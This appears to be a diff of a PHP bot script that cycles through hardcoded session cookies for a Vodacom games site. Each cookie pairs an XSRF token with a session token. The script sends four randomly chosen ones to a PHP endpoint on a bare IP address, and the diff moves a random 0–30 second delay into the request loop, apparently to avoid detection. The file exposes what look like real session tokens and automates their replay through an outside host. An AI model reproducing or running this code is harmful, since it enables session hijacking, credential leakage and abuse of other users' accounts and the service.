@@ -13,7 +13,6 @@ $curl->option(CURLOPT_TIMEOUT, 900);
 $starttime = microtime(true);
 
 $c_values =[
-sleep(rand(0,30));
 
 // 'XSRF-TOKEN=eyJpdiI6InlpT3lIVGt0RXIyR3o0U1JxWmk3a0E9PSIsInZhbHVlIjoiVXJ5dTFPK3RLOGZabHZpaGNDejFoTmM0czhRMEE2cm1tc0pnUks1SThFZDEyN2hzc3QyVktabzNHNlJ4Mm8zTUQyK2h1L2YwN1l0S1hQcFMrdGVUdzJydEZucDNWQlF5ODF0bGZlNkw1eW1yR3U2QzB5MzBSVWJJVW41NnYxTGciLCJtYWMiOiJhZjRjZThlMjhjZTY4ZDE3MzExZmEyMWM5OWE5MmE4OTk0MDMxM2I2MmM5NWY1ODFjYzdjNGQxYTZjNWYwZDU4IiwidGFnIjoiIn0%3D; vodacom_mzansi_games_session=eyJpdiI6IkVVMmIrMmNpT1piRUMyNnBWRjFRbUE9PSIsInZhbHVlIjoiTUVGTTR6SllPd3cxcTJsL3MxYVp0OEVxZmxmT1BDU2xQNnZBR0dNamwvcXJ4UVU0Zk8xZ1UwRTlONkFlVnRKNk9oY0x0Nmo0QmZpeVF4K3BRZGViMDRHMGI1QlVRaTU0cHY2UFYyYlhnZEhBUFc1dnVLYStNZU9FSm9QM2I4L3IiLCJtYWMiOiJlM2EzNzM5NzY0ZmZjOGUxM2U3NzVhZmEyYTNkYWNmMDQxMTgzMTAxYmM5YWQ1NTZmNDJhMWMxNmI3OTFlMjhlIiwidGFnIjoiIn0%3D',
 
@@ -45,7 +44,7 @@ shuffle($c_values);
 $randomItems = array_slice($c_values, 0, 4); 
 
 foreach ($randomItems as $c) {
-
+sleep(rand(0,30));
     
     $url = 'http://102.210.146.144/newupdate/xavi.php?c=' . urlencode($c);
 
